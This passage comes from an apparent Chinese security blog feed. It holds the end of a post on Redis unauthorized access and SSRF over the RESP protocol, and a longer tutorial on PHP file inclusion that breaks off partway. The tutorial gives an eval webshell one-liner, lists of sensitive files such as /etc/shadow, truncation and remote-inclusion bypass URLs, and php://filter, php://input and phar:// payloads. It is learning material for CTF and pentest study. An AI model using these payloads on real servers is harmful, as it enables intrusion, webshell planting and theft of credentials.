sets)等类型。</strong></p><p>Redis是完全开源的，遵守BSD协议，是一个高性能的key-value数据库，相较于其他的key-value缓存产品，主要有三个特点：</p><ul><li>Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。</li><li>Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。</li><li>Redis支持数据的备份，即master-slave模式的数据备份。</li></ul><p>Redis的优势：</p><ul><li>性能极高 – Redis能读的速度是110000次&#x2F;s,写的速度是81000次&#x2F;s 。</li><li>丰富的数据类型 – Redis支持二进制案例的 Strings, Lists, Hashes, Sets 及 Ordered Sets 数据类型操作。</li><li>原子 – Redis的所有操作都是原子性的，意思就是要么成功执行要么失败完全不执行。单个操作是原子性的。多个操作也支持事务，即原子性，通过MULTI和EXEC指令包起来。</li><li>丰富的特性 – Redis还支持 publish&#x2F;subscribe, 通知, key 过期等等特性。</li></ul><p>Redis和其他的key-value存储有什么不同：</p><ul><li>Redis有着更为复杂的数据结构并且提供对他们的原子性操作，这是一个不同于其他数据库的进化路径。Redis的数据类型都是基于基本数据结构的同时对程序员透明，无需进行额外的抽象。</li><li>Redis运行在内存中但是可以持久化到磁盘，所以在对不同数据集进行高速读写时需要权衡内存，因为数据量不能大于硬件内存。在内存数据库方面的另一个优点是，相比在磁盘上相同的复杂的数据结构，在内存中操作起来非常简单，这样Redis可以做很多内部复杂性很强的事情。同时，在磁盘格式方面他们是紧凑的以追加的方式产生的，因为他们并不需要进行随机访问。</li></ul></blockquote><p><strong>常见的漏洞使用方式：</strong></p><h5 id="Redis未授权访问："><a href="#Redis未授权访问：" class="headerlink" title="Redis未授权访问："></a>Redis未授权访问：</h5><blockquote><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip访问等，这样将会将 Redis服务暴露到公网上。</p><p>如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取Redis 的数据。 </p></blockquote><p>也就是当Redis直接被绑定在公网的时候，可以直接伪造请求，然后对<code>Redis</code>直接进行访问，执行相关的指令。</p><p><strong>漏洞危害：</strong></p><blockquote><p>（1）攻击者无需认证访问到内部数据，可能导致敏感信息泄露，也可以恶意执行flushall来清空所有数据<br>（2）攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件<br>（3）如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器</p></blockquote><p><strong>Redis常见命令：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220705140318215.png" alt="image-20220705140318215"></p><p>那么相关的使用方式，就是当<code>Redis</code>没有被暴露在公网的情况下，使用<code>SSRF</code>从内网进行攻击反打。</p><h5 id="SSRF利用Redis协议方式："><a href="#SSRF利用Redis协议方式：" class="headerlink" title="SSRF利用Redis协议方式："></a>SSRF利用Redis协议方式：</h5><blockquote><p>redis客户端与服务端通信，使用RESP（REdis Serialization Protocal，redis序列化协议）协议通信，该协议是专门为redis设计的通信协议，但也可以用于其它客户端-服务器通信的场景。</p><p>RESP可以用于序列化不同的数据类型，如：整型、字符串、数组…并且为错误提供专门的类型；客户端发送请求时，以字符串数组的作为待执行命令的参数。redis服务器根据不同的命令返回不同的数据类型。 </p><p>RESP协议支持五种数据类型：<br>1、简单字符串（Simple Strings）<br>2、错误数据（Errors）<br>3、整数（Integers）<br>4、批量字符串（Bulk Strings）<br>5、数组（Arrays）</p><p>当客户端请求服务器的时候，会以批量数据类型的数组请求封装。当服务端发送响应给客户端的时候，根据命令实现的不同，返回响应的数据类型。</p><p>不同的数据类型是根据请求&#x2F;响应报文的第一个字节进行区分的：</p><ul><li>简单字符串以+开头</li><li>错误数据以-开头</li><li>整数以:开头</li><li>批量字符串以$开头</li><li>数组以*开头</li></ul><p>RESP协议发不同部分，使用<code>\r\n</code>（CRLF）进行分隔。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220705142938907.png" alt="image-20220705142938907"></p><p>类似上面的数据类型，因为是建立在TCP层，因此可以使用wireshark进行抓包分析。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220705143132813.png" alt="image-20220705143132813"></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含</title>
      <link href="/2022/06/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%9A/"/>
      <url>/2022/06/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%9A/</url>
      
        <content type="html"><![CDATA[<h1 id="文件包含漏洞："><a href="#文件包含漏洞：" class="headerlink" title="文件包含漏洞："></a>文件包含漏洞：</h1><p><strong>前言</strong>：</p><p>关于文件包含漏洞，我一直都没有进行一个比较系统的总结，现在我就对基于PHP语言下的文件包含漏洞进行对包含原理的笔记。</p><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>这个漏洞出现的原理，主要和现在一般采用的模块化工作方式有关系。为了保证开发的效率以及后期改正的情况，程序工作者往往采用模块化的方式对程序进行一个编写，这样在后期出现问题的时候，就可以直接对模块进行维修，而不用对所有代码进行重新审计。这样就保证了代码的简洁性。</p><p>基于以上原理，在对于模块化的代码文件进行引用的时候，会需要使用一些特定的函数对文件进行一个“包含”。同时，为了保证程序的灵活性，进行包含的文件往往都会是一个可变的参数。</p><p>这就给黑客的攻击提供了空间。</p><p>黑客攻击往往会对包含的文件进行修改，使得被包含的文件内容超出程序编写者的预想，而导致出现风险。</p><h2 id="文件包含函数（PHP）"><a href="#文件包含函数（PHP）" class="headerlink" title="文件包含函数（PHP）:"></a>文件包含函数（PHP）:</h2><p>在PHP中，有四种函数可以使用文件包含的效果：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include()</span><br><span class="line">include_once()</span><br><span class="line">require()</span><br><span class="line">require_once()</span><br></pre></td></tr></table></figure><p>这里我们可以通过手册来查询一下这几个函数的作用：</p><p><a href="https://www.php.net/manual/zh/index.php">https://www.php.net/manual/zh/index.php</a></p><p>首先是include()，手册中是这么写的：<code>include</code> 表达式包含并运行指定文件。 </p><p>这一点也同时适用于require()函数。</p><p>这两个函数的主要区别只是在于，include()函数在运行时，如果出错了，会只是产生一个warning，然后继续运行后面的脚本。</p><p>但是require()函数在出错的时候，会直接产生一个**<code>E_COMPILE_ERROR</code>的错误，导致程序直接停止运行。</p><p>而剩下的两个函数，include_once()于require_once()和上面的函数基本相同，只是它们只会对同一个文件进行一次包含。因此，常用于for、while这种循环中。</p><h2 id="文件包含漏洞常常出现的作用："><a href="#文件包含漏洞常常出现的作用：" class="headerlink" title="文件包含漏洞常常出现的作用："></a>文件包含漏洞常常出现的作用：</h2><h3 id="1、本地文件包含："><a href="#1、本地文件包含：" class="headerlink" title="1、本地文件包含："></a>1、本地文件包含：</h3><p>这个漏洞的攻击方式通常需要配合目录穿越漏洞进行一同操作。</p><p>通过..&#x2F;来进行本地文件的读取，通过修改文件路径来改变对文件的包含，以此获取一些隐私的信息，或是flag。</p><p>常见敏感路径：</p><p><strong>windows:</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c:\boot.ini // 查看系统版本</span><br><span class="line"></span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件</span><br><span class="line"></span><br><span class="line">c:\windows\repair\sam // 存储Windows系统初次安装的密码</span><br><span class="line"></span><br><span class="line">c:\ProgramFiles\mysql\my.ini // MySQL配置</span><br><span class="line"></span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码</span><br><span class="line"></span><br><span class="line">c:\windows\php.ini // php 配置信息</span><br></pre></td></tr></table></figure><p><strong>Linux:</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/passwd // 账户信息</span><br><span class="line"></span><br><span class="line">/etc/shadow // 账户密码文件</span><br><span class="line"></span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件</span><br><span class="line"></span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置</span><br><span class="line"></span><br><span class="line">/usr/local/app/php5/lib/php.ini // PHP相关配置</span><br><span class="line"></span><br><span class="line">/etc/httpd/conf/httpd.conf // Apache配置文件</span><br><span class="line"></span><br><span class="line">/etc/my.conf // mysql 配置文件</span><br></pre></td></tr></table></figure><p>这里可以通过对于文件路径的推测来进行对于文件的读取。 </p><h4 id="session文件包含漏洞："><a href="#session文件包含漏洞：" class="headerlink" title="session文件包含漏洞："></a>session文件包含漏洞：</h4><p>这个漏洞属于是文件包含漏洞的二次衍生漏洞。</p><p>首先是关于session文件的说明:</p><p>session文件，基本上可以理解为是一个临时的，存放在服务器端的容器，当用户没有关闭浏览器之前，其中的东西都是存在的。这个容器一般用于存储用户的一些信息。当用户进行访问的时候，服务器会为每个用户分配唯一的session。</p><p>这个文件和cookie不一样的地方就是，这个文件都是存储在服务器上的，而cookie文件是存储在用户的主机上的。</p><p>本质上，采用session是为了对用户的浏览状态进行一个保留，当在同一域名中切换时，可以对用户当前的状态进行保留，同时可以避免用户更改cookie文件导致出现不必要的危险。</p><hr><p>对于session的存储位置，一般可以直接通过phpinfo()去获取，通过直接查看phpinfo()中session.save_path的部分，就可以看见对应的路径。</p><p>一般来说，在Linux系统中，会默认存储在&#x2F;var&#x2F;lib&#x2F;php&#x2F;session的目录下面。</p><p>而在windows系统中，默认C:\WINDOWS\Temp或集成环境下的tmp文件夹里</p><p>可以通过代码对session中的内容进行控制，传入恶意代码。</p><p>eg:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfs</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfs&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]=<span class="variable">$ctfs</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以通过这个例子来看一下用来控制session文件的代码。</p><p>首先是来看一下session_start()这个函数的作用，在官方文档（<a href="https://www.php.net/manual/zh/function.session-start.php%EF%BC%89%E4%B8%AD%E5%86%99%E9%81%93%EF%BC%9A">https://www.php.net/manual/zh/function.session-start.php）中写道：</a></p><blockquote><p>   <strong>session_start()</strong> 会创建新会话或者重用现有会话。   如果通过 GET 或者 POST 方式，或者使用 cookie 提交了会话 ID，   则会重用现有会话。  </p><p>   当会话自动开始或者通过 <strong>session_start()</strong> 手动开始的时候，   PHP 内部会调用会话管理器的 open 和 read 回调函数。   会话管理器可能是 PHP 默认的，   也可能是扩展提供的（SQLite 或者 Memcached 扩展），   也可能是通过 <a href="https://www.php.net/manual/zh/function.session-set-save-handler.php">session_set_save_handler()</a> 设定的用户自定义会话管理器。   通过 read 回调函数返回的现有会话数据（使用特殊的序列化格式存储），   PHP 会自动反序列化数据并且填充 $_SESSION 超级全局变量。  </p></blockquote><p>这里可以看出来，如果要创建一个session文件，就要首先用这个函数进行一个类似于初始化的操作（即是之前写的创建新会话或重用现有会话）</p><p>然后对代码后面进行分析：</p><p>将一个值通过get方式进行传参，然后使用创建一个超全局变量，将其值赋为传入的参数。</p><p><strong>通常，在PHP脚本结束的时候，会将未被销毁的session变量保存在服务器的一个路径文件下</strong></p><p>也就是在执行完以上的代码之后，将get获取的变量存入到session文件中。</p><p>这时我们可以知道的是，session文件名会被命名为sess_+sessionid的格式。</p><p>sessionid被存放在服务器内存和客户机的cookie里面，可以通过开发者模式看见。</p><p>这就可以发现一个问题，因为没有对传入的ctfs这个参数进行过滤，所以会导致可以传入小马进行getshell。</p><p>例如直接将传入的值改为 <?php @eval($_POST['hacker']); ?>，恶意代码就会被保存至服务器文件中，此时如果存在文件包含漏洞，就可以将session文件进行包含解析为php内容。</p><p>导致getshell。</p><h3 id="2、有限制本地文件包含漏洞："><a href="#2、有限制本地文件包含漏洞：" class="headerlink" title="2、有限制本地文件包含漏洞："></a>2、有限制本地文件包含漏洞：</h3><h4 id="00截断"><a href="#00截断" class="headerlink" title="%00截断:"></a>%00截断:</h4><p>这里需要使用到PHP的一个版本漏洞，即文件名的%00截断：</p><p>条件：1、magic_quotes_gpc &#x3D; Off   2、php版本&lt;5.3.4</p><p>通常采用的绕过方式：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php?filename=../../../../../../../boot.ini%00</span><br></pre></td></tr></table></figure><p>代码分析：</p><p>这个代码很简单，可以看见的是，$filename变量被通过get方式传入一个值，然后通过与.html进行拼接后，形成需要被包含的文件名。</p><p>因此，当传入构建的payload的时候，会在检测到boot.ini%00的时候被截断，就将包含的文件变为了boot.ini。</p><h4 id="路径长度截断："><a href="#路径长度截断：" class="headerlink" title="路径长度截断："></a>路径长度截断：</h4><p>条件：windows OS，点号需要长于256；linux OS 长于4096</p><p>这里是利用的两种操作系统下的目录长度限制。</p><blockquote><p>Windows下目录最大长度为256个字节</p><p>Linux下目录最大长度为4096个字节</p></blockquote><p>超过目录最大长度的时候，超出的部分会被丢弃。</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码解释和之前一样</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</span><br></pre></td></tr></table></figure><p>原理：</p><p>这里是通过使用文件路径中的.&#x2F;表示本文件，来创造垃圾字段长度，来对后面.html文件后缀进行截断。</p><h4 id="点截断："><a href="#点截断：" class="headerlink" title="点截断："></a>点截断：</h4><p>基本原理类似于长度截断，直接放payload了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php</span><br><span class="line">?filename=test.txt.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br></pre></td></tr></table></figure><p>点符号超过256字节即可在windows系统下进行截断。</p><h3 id="3、远程文件包含漏洞"><a href="#3、远程文件包含漏洞" class="headerlink" title="3、远程文件包含漏洞:"></a>3、远程文件包含漏洞:</h3><p>PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include&#x2F;require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。</p><blockquote><p>allow_url_fopen配置作用：该配置设置为off的时候，用户将不能通过url打开文件。</p><p>allow_url_include配置作用：当该配置被设置为了off的时候，访问者将不能包含本网站之外的文件。</p></blockquote><p>通过对于上面两个的配置了解，应该就大概能知道为什么会导致远程文件包含漏洞的产生。</p><p><strong>从PHP5.2开始，allow_url_include()就被默认为是关闭的了，而allow_url_fopen却始终是开启的。</strong></p><h4 id="1、无限制远程文件包含漏洞："><a href="#1、无限制远程文件包含漏洞：" class="headerlink" title="1、无限制远程文件包含漏洞："></a>1、无限制远程文件包含漏洞：</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php?filename=http://192.168.91.133/FI/php.txt</span><br></pre></td></tr></table></figure><p>解释一下上述payload:</p><p>这里是通过get方式将一个文件对于的url链接作为文件名传入了进去，再对不在自己服务器上的文件进行了一个包含文件。</p><p>然后.txt文件中的PHP探针被执行，成功的getshell。</p><h4 id="有限制远程文件包含漏洞绕过思路："><a href="#有限制远程文件包含漏洞绕过思路：" class="headerlink" title="有限制远程文件包含漏洞绕过思路："></a>有限制远程文件包含漏洞绕过思路：</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>] . <span class="string">&quot;.html&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>简单的参考代码。</p><p>分析：当尝试通过远程文件包含的时候，会在文件的后缀处拼接一个.html，导致文件的后缀出现改变。</p><p>这里列出比较常见的几种绕过方式：</p><h5 id="1、问号绕过："><a href="#1、问号绕过：" class="headerlink" title="1、问号绕过："></a>1、问号绕过：</h5><p>这种绕过的方式比较简单，就是在文件对应的url链接部分的后面加上一个?就可以了，这样就会出现一个截断的效果。</p><p>payload如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt?</span><br></pre></td></tr></table></figure><h5 id="2、-号绕过："><a href="#2、-号绕过：" class="headerlink" title="2、#号绕过："></a>2、#号绕过：</h5><p>同上，但是要注意对#号进行url编码：</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt&amp;23</span><br></pre></td></tr></table></figure><p>这里的%23就是#的url编码格式。</p><h5 id="3、空格绕过："><a href="#3、空格绕过：" class="headerlink" title="3、空格绕过："></a>3、空格绕过：</h5><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt%20</span><br></pre></td></tr></table></figure><p>同上，这里要对空格进行url编码，变成%20。</p><h3 id="4、PHP伪协议："><a href="#4、PHP伪协议：" class="headerlink" title="4、PHP伪协议："></a>4、PHP伪协议：</h3><p>这里是比较重要的地方，主要是对php伪协议的了解。</p><p>这里首先放一个师傅的文章<a href="https://arg1nt.gitee.io/2021/03/undefined/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%BF%9B%E9%98%B6/">https://arg1nt.gitee.io/2021/03/undefined/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%BF%9B%E9%98%B6/</a></p><p>这是一篇比较实用的总结。</p><p>要进行对PHP伪协议的学习，首先要对伪协议有一个了解，这里我把PHP使用手册贴上来，看到这里的大家可以去翻阅一下。</p><p><strong><a href="https://www.php.net/manual/zh/wrappers.php.php">https://www.php.net/manual/zh/wrappers.php.php</a></strong></p><p>一般来说主要会遇到的PHP伪协议有这样几种：</p><p>file:&#x2F;&#x2F;</p><p>php:&#x2F;&#x2F;</p><p>phar:&#x2F;&#x2F;</p><p>zlib:&#x2F;&#x2F;</p><p>对于开始学PHP伪协议的人，我建议还是首先答题的了解一下伪协议的效果以及作用能力。</p><p>可以考虑参考一下这一个文章：<a href="https://m.php.cn/article/430458.html">https://m.php.cn/article/430458.html</a></p><p><img src="C:\Users\Ho1L0w_By\AppData\Roaming\Typora\typora-user-images\image-20211120170350098.png" alt="image-20211120170350098"></p><p>测试用代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="php-x2F-x2F-伪协议："><a href="#php-x2F-x2F-伪协议：" class="headerlink" title="php:&#x2F;&#x2F;伪协议："></a>php:&#x2F;&#x2F;伪协议：</h4><p>按照上面的图片可知，php:&#x2F;&#x2F;协议主要是用于提供访问输入&#x2F;输出流的方法，同时也将会允许访问PHP的错误描述符，内存、磁盘备份的临时文件流，以及可以操作其他读写文件资源的过滤器。</p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20211120171938072.png" alt="image-20211120171938072"></p><p>对于php:&#x2F;&#x2F; 这个协议来说，是支持多种的过滤器嵌套的，也就是可以使用多个过滤器。</p><h5 id="php-x2F-x2F-filter（本地磁盘文件读取）"><a href="#php-x2F-x2F-filter（本地磁盘文件读取）" class="headerlink" title="php:&#x2F;&#x2F;filter（本地磁盘文件读取）"></a>php:&#x2F;&#x2F;filter（本地磁盘文件读取）</h5><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20211120194724327.png" alt="image-20211120194724327"></p><p>这个伪协议是一个元封装器，设计着用于数据流打开的时候，“筛选过滤“应用，可以对本地磁盘文件进行读写。</p><p>简单来说就是可以用于读取文件源代码，一般在知道网站路径的情况下使用。</p><p><strong>比较特殊的地方是，filter再两个设置都是off的时候还是可以使用。</strong></p><p>格式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/resource=[文件名]</span><br><span class="line">eg:</span><br><span class="line">http://127.0.0.1/include.php?file=php://filter/resource=phpinfo.txt</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?filename=php://filter/convert.base64-encode/resource=xxx.php ?</span><br></pre></td></tr></table></figure><p>通过以上payload可以对文件进行一个读取。（针对php文件会需要使用base64编码进行输出，否则会直接将源代码当作PHP代码执行，会看不见内容）</p><p>此时返回的将是对应.php文件的base64加密后的代码内容。<strong>对于不在同一目录下的文件，需要写好相对路径</strong></p><p>无论是post还是get方式都可以使用。</p><h5 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h5><p>这里引用以下php手册中的描述：</p><blockquote><p>php:&#x2F;&#x2F;input 是个可以访问请求的原始数据的只读流。    POST 请求的情况下，最好使用 php:&#x2F;&#x2F;input 来代替 $HTTP_RAW_POST_DATA，因为它不依赖于特定的 php.ini 指令。    而且，这样的情况下 $HTTP_RAW_POST_DATA 默认没有填充，    比激活 <code>always_populate_raw_post_data</code>    潜在需要更少的内存。    <code>enctype=&quot;multipart/form-data&quot;</code> 的时候    php:&#x2F;&#x2F;input 是无效的。   </p></blockquote><p>allow_url_fopen和allow_url_include这两个参数都要处于打开的状态。但是使用enctype&#x3D;”multipart&#x2F;form-data”的时候php:&#x2F;&#x2F;input是无效的。</p><p>具体的效果就是可以将POST请求中的数据作为PHP代码来执行，但是需要使用include()函数进行来打开。</p><p>主要做法是将GET部分修改为php:&#x2F;&#x2F;input，然后POST部分修改为想要传输的PHP代码。</p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/2018060617565626" alt="img"></p><h4 id="file-x2F-x2F-伪协议："><a href="#file-x2F-x2F-伪协议：" class="headerlink" title="file:&#x2F;&#x2F;伪协议："></a>file:&#x2F;&#x2F;伪协议：</h4><p>通过file协议可以访问到本地文件系统，同时可以读取到文件的内容。</p><p>引用PHP手册：</p><blockquote><p>   <em>文件系统</em> 是 PHP 使用的默认封装协议，展现了本地文件系统。   当指定了一个相对路径（不以&#x2F;、\、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。   在很多情况下是脚本所在的目录，除非被修改了。   使用 CLI 的时候，目录默认是脚本被调用时所在的目录。  </p><p>   在某些函数里，例如 <a href="https://www.php.net/manual/zh/function.fopen.php">fopen()</a> 和 <a href="https://www.php.net/manual/zh/function.file-get-contents.php">file_get_contents()</a>，   <code>include_path</code> 会可选地搜索，也作为相对的路径。  </p></blockquote><p>这个协议本身不受allow_url_fopen和allow_url_include这两个参数的影响。 </p><p><strong>同时，传入的文件路径只能是绝对路径。</strong></p><h4 id="data-x2F-x2F-伪协议："><a href="#data-x2F-x2F-伪协议：" class="headerlink" title="data:&#x2F;&#x2F;伪协议："></a>data:&#x2F;&#x2F;伪协议：</h4><blockquote><p>自 PHP 5.2.0 起 data:（<a href="http://www.faqs.org/rfcs/rfc2397">» RFC    2397</a>）数据流封装器开始有效。  </p></blockquote><p>数据流封装器，和php:&#x2F;&#x2F;相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的。</p><p><strong>也就是相当于是一个命令执行的语句，通过url进行传入</strong></p><p>需要allow_url_include，allow_url_fopen两个配置参数on。</p><p>类似于php:&#x2F;&#x2F;input， 可用于file_get_contents()绕过。</p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20211202151424208.png" alt="image-20211202151424208"></p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20211202151722218.png" alt="image-20211202151722218"></p><p>这里是在一个使用方法。</p><p>值得注意的是上面的提示，如果不将等号和加号变成url编码形式，是真的会识别不了。</p><h4 id="phar-x2F-x2F-伪协议："><a href="#phar-x2F-x2F-伪协议：" class="headerlink" title="phar:&#x2F;&#x2F;伪协议："></a>phar:&#x2F;&#x2F;伪协议：</h4><p>引用一下PHP手册上的介绍：</p><blockquote><p>phar:&#x2F;&#x2F; 数据流包装器自   PHP 5.3.0 起开始有效。详细的描述可参见 <a href="https://www.php.net/manual/zh/phar.using.stream.php">Phar 数据流包装器</a>。  </p></blockquote><p>这个函数就是PHP中解开压缩包的一个函数，不管后缀是什么，都可以作为压缩包来进行解压。</p><p>这里比较主要的用法就是首先写一个一句话木马，然后，再把木马变成一个zip格式的压缩包，将后缀改变为jpg,png格式，然后再把它传上去。</p><p>接下来就使用phar在url中进行一句话木马的访问，基本格式如下：</p><p>?file&#x3D;phar:&#x2F;&#x2F;压缩包&#x2F;内部文件 phar:&#x2F;&#x2F;xxx.png&#x2F;shell.php</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  = $_GET[&#x27;filename&#x27;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>测试代码</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php?filename=phar://shell.jpg/shell.php</span><br></pre></td></tr></table></figure><p>这样就将shell.php文件进行了一个文件包含。</p><h4 id="zip-x2F-x2F-伪协议："><a href="#zip-x2F-x2F-伪协议：" class="headerlink" title="zip:&#x2F;&#x2F;伪协议："></a>zip:&#x2F;&#x2F;伪协议：</h4><blockquote><p>zlib:&#x2F;&#x2F;</p><p>bzip2:&#x2F;&#x2F;</p><p>zip:&#x2F;&#x2F;</p></blockquote><p>以上三个伪协议的效果是一样的。</p><blockquote><p>   zlib: 的功能类似 <a href="https://www.php.net/manual/zh/function.gzopen.php">gzopen()</a>，但是   其数据流还能被 <a href="https://www.php.net/manual/zh/function.fread.php">fread()</a> 和其他文件系统函数使用。   不建议使用，因为会和其他带“:”字符的文件名混淆；   请使用 compress.zlib:&#x2F;&#x2F; 替代。  </p><p>   compress.zlib:&#x2F;&#x2F;、   compress.bzip2:&#x2F;&#x2F;   和 <a href="https://www.php.net/manual/zh/function.gzopen.php">gzopen()</a>、<a href="https://www.php.net/manual/zh/function.bzopen.php">bzopen()</a>   是相等的。并且可以在不支持 fopencookie 的系统中使用。  </p><p>   <a href="https://www.php.net/manual/zh/book.zip.php">ZIP 扩展</a> 注册了 zip: 封装器。     自 PHP 7.2.0 和 libzip 1.2.0+ 起，加密归档开始支持密码，允许数据流中使用密码。    字节流上下文（stream contexts）中使用 <code>&#39;password&#39;</code> 选项设置密码。  